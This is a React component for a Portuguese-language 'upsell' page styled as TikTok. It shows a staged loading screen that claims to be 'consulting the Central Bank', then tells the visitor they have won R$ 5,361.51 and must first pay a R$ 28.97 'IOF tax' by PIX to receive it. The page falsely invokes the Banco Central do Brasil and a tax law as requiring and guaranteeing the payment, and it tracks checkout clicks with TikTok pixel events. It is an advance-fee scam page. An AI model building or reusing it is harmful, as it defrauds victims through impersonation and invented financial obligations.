import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { AlertTriangle, CheckCircle, AlertCircle, Shield, Clock } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import pixLogo from "@/assets/pix-logo-icon.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const RED = "#FE2B54";
const GREEN = "#10B981";
const IOF_TAX = 28.97;
const VALOR_GANHO = 5361.51;
const TOTAL_RECEBER = 5390.48;

const Upsell4 = () => {
  const [screen, setScreen] = useState<"loading" | "main">("loading");
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState("Verificando dados...");
  const [visible, setVisible] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell4", content_type: "iof" } });
  }, []);

  useEffect(() => {
    if (screen !== "loading") return;
    const steps = [
      { at: 0, text: "Verificando dados...", pct: 0 },
      { at: 800, text: "Calculando impostos...", pct: 30 },
      { at: 2000, text: "Consultando Banco Central...", pct: 60 },
      { at: 3500, text: "Finalizando...", pct: 90 },
      { at: 4500, text: "Pronto!", pct: 100 },
    ];
    const timers = steps.map((s) =>
      setTimeout(() => { setStatusText(s.text); setProgress(s.pct); }, s.at)
    );
    const mainTimer = setTimeout(() => {
      setScreen("main");
      requestAnimationFrame(() => setVisible(true));
    }, 5200);
    return () => { timers.forEach(clearTimeout); clearTimeout(mainTimer); };
  }, [screen]);

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell4", value: IOF_TAX } });
    navigate("/pagamento");
  };

  const fmt = (v: number) => v.toFixed(2).replace(".", ",");

  const fadeUp = (delay: number) => ({
    opacity: visible ? 1 : 0,
    transform: visible ? "translateY(0)" : "translateY(18px)",
    transition: `opacity 0.5s ease ${delay}s, transform 0.5s ease ${delay}s`,
  });

  if (screen === "loading") {
    return (
      <div style={{
        fontFamily: FONT, background: "#F5F5F5", minHeight: "100vh",
        display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 24,
      }}>
        <div style={{
          background: "#fff", borderRadius: 16, padding: "40px 32px",
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
          textAlign: "center", width: "100%", maxWidth: 340,
        }}>
          <p style={{ fontSize: 14, color: "#333", fontWeight: 600, marginBottom: 20, transition: "opacity 0.3s" }}>
            {statusText}
          </p>
          <div style={{ width: "100%", height: 6, background: "#F1F1F3", borderRadius: 3, overflow: "hidden" }}>
            <div style={{
              width: `${progress}%`, height: "100%",
              background: RED, borderRadius: 3,
              transition: "width 0.5s ease",
              boxShadow: `0 0 8px rgba(254,43,84,0.3)`,
            }} />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ fontFamily: FONT, background: "#F5F5F5", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{
        width: "100%", background: "#fff", padding: "14px 0",
        borderBottom: "1px solid #eee",
        display: "flex", justifyContent: "center",
        position: "sticky", top: 0, zIndex: 100,
        boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
      }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} loading="eager" decoding="async" />
      </div>

      {/* Alert Banner */}
      <div style={{
        background: "#FFF8E1", padding: "10px 16px",
        display: "flex", alignItems: "center", gap: 8,
        borderBottom: "1px solid #FFE082",
        boxShadow: "0 1px 4px rgba(0,0,0,0.04)",
      }}>
        <AlertTriangle size={16} color="#F59E0B" />
        <span style={{ fontSize: 12, fontWeight: 700, color: "#92400E" }}>Imposto (IOF) obrigatório</span>
      </div>

      {/* Container */}
      <div style={{ maxWidth: 449, margin: "0 auto", width: "100%", padding: "16px 12px 110px" }}>

        {/* Title Card */}
        <div style={{
          ...fadeUp(0.05),
          background: "#fff", borderRadius: 16, padding: "24px 20px",
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
        }}>
          <h1 style={{ fontSize: 16, fontWeight: 700, color: "#000", marginBottom: 8 }}>
            Imposto sobre Operações Financeiras (IOF)
          </h1>
          <p style={{ fontSize: 13, color: "#555", lineHeight: 1.6, marginBottom: 6 }}>
            O pagamento do IOF é obrigatório e exigido pelo{" "}
            <strong style={{ color: "#000" }}>Banco Central do Brasil (Lei nº 8.894/94)</strong>
          </p>
          <p style={{ fontSize: 12, color: RED, lineHeight: 1.5 }}>
            <span style={{ fontWeight: 700 }}>* </span>
            É necessário realizar o pagamento do IOF para receber o valor acumulado.
          </p>
        </div>

        {/* Summary Card */}
        <div style={{
          ...fadeUp(0.15),
          background: "#fff", borderRadius: 16, padding: "20px",
          marginTop: 12,
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
        }}>
          <p style={{ fontSize: 14, fontWeight: 700, color: "#000", marginBottom: 14 }}>Resumo</p>

          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderTop: "1px solid #F1F1F3", borderBottom: "1px solid #F1F1F3" }}>
            <span style={{ fontSize: 13, color: "#666" }}>Valor ganho</span>
            <span style={{ fontSize: 14, fontWeight: 700, color: "#000" }}>R$ {fmt(VALOR_GANHO)}</span>
          </div>

          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderBottom: "1px solid #F1F1F3" }}>
            <div>
              <span style={{ fontSize: 13, color: "#666" }}>Valor a ser pago (IOF)</span>
              <p style={{ fontSize: 11, color: "#aaa", margin: "2px 0 0" }}>Imposto sobre Operações Financeiras</p>
            </div>
            <span style={{ fontSize: 14, fontWeight: 700, color: RED }}>- R$ {fmt(IOF_TAX)}</span>
          </div>

          <div style={{
            display: "flex", justifyContent: "space-between", alignItems: "center",
            padding: "14px 0",
            background: "rgba(16,185,129,0.04)", borderRadius: 8, marginTop: 4, paddingLeft: 8, paddingRight: 8,
          }}>
            <span style={{ fontSize: 14, fontWeight: 700, color: "#000" }}>Total a receber</span>
            <span style={{ fontSize: 18, fontWeight: 800, color: GREEN }}>R$ {fmt(TOTAL_RECEBER)}</span>
          </div>

          <div style={{
            display: "flex", alignItems: "center", gap: 8,
            background: "#FFF8E1", padding: "10px 12px", borderRadius: 10, marginTop: 12,
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.6)",
          }}>
            <AlertCircle size={14} color="#F59E0B" />
            <span style={{ fontSize: 11, color: "#666", lineHeight: 1.4 }}>
              O pagamento de R$ {fmt(TOTAL_RECEBER)} será processado via PIX imediatamente.
            </span>
          </div>
        </div>

        {/* Guarantee Card */}
        <div style={{
          ...fadeUp(0.25),
          background: "#fff", borderRadius: 16, padding: "16px 20px",
          marginTop: 12,
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
          display: "flex", alignItems: "center", gap: 12,
        }}>
          <div style={{
            width: 36, height: 36, background: GREEN, borderRadius: "50%",
            display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            boxShadow: `0 3px 12px rgba(16,185,129,0.25)`,
          }}>
            <CheckCircle size={18} color="#fff" />
          </div>
          <div>
            <p style={{ fontSize: 13, fontWeight: 700, color: "#000", marginBottom: 2 }}>Garantia de recebimento</p>
            <p style={{ fontSize: 11, color: "#666", lineHeight: 1.4 }}>
              O valor de R$ {fmt(TOTAL_RECEBER)} é garantido pelo Banco Central do Brasil
            </p>
          </div>
        </div>

        {/* Payment Method Card */}
        <div style={{
          ...fadeUp(0.3),
          background: "#fff", borderRadius: 16, padding: "18px 20px",
          marginTop: 12,
          boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
        }}>
          <p style={{ fontSize: 14, fontWeight: 700, color: "#000", marginBottom: 12 }}>Método de pagamento</p>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
            <img src={pixLogo} alt="PIX" style={{ height: 24 }} />
          </div>
          <div style={{
            display: "flex", alignItems: "center", gap: 8,
            background: "#F8F9FB", padding: "10px 12px", borderRadius: 10,
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 3px rgba(0,0,0,0.03)",
          }}>
            <AlertCircle size={13} color="#848286" />
            <span style={{ fontSize: 11, color: "#666", lineHeight: 1.4 }}>
              Pague com PIX! Pagamentos simples, práticos e realizados em segundos.
            </span>
          </div>
        </div>

        {/* CTA */}
        <div style={{ ...fadeUp(0.35), marginTop: 16 }}>
          <button
            onClick={handlePagar}
            style={{
              width: "100%", border: 0, borderRadius: 99,
              padding: "18px 16px", fontSize: 15, fontWeight: 700,
              cursor: "pointer", color: "#fff",
              background: "#003772",
              fontFamily: FONT, letterSpacing: "0.2px",
              boxShadow: "0 6px 24px rgba(0,55,114,0.25), 0 2px 6px rgba(0,55,114,0.12), inset 0 1px 0 rgba(255,255,255,0.1)",
              transition: "transform 0.15s ease",
            }}
            onMouseDown={e => (e.currentTarget.style.transform = "scale(0.98)")}
            onMouseUp={e => (e.currentTarget.style.transform = "scale(1)")}
            onMouseLeave={e => (e.currentTarget.style.transform = "scale(1)")}
          >
            Pagar Imposto — R$ {fmt(IOF_TAX)}
          </button>
        </div>

        {/* Security footer */}
        <div style={{
          ...fadeUp(0.4),
          display: "flex", flexDirection: "column", alignItems: "center", gap: 6,
          marginTop: 16,
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
            <Shield size={11} color={GREEN} />
            Pagamento 100% seguro e protegido
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
            <Clock size={11} />
            Processamento instantâneo via PIX
          </div>
        </div>
      </div>
    </div>
  );
};

export default Upsell4;
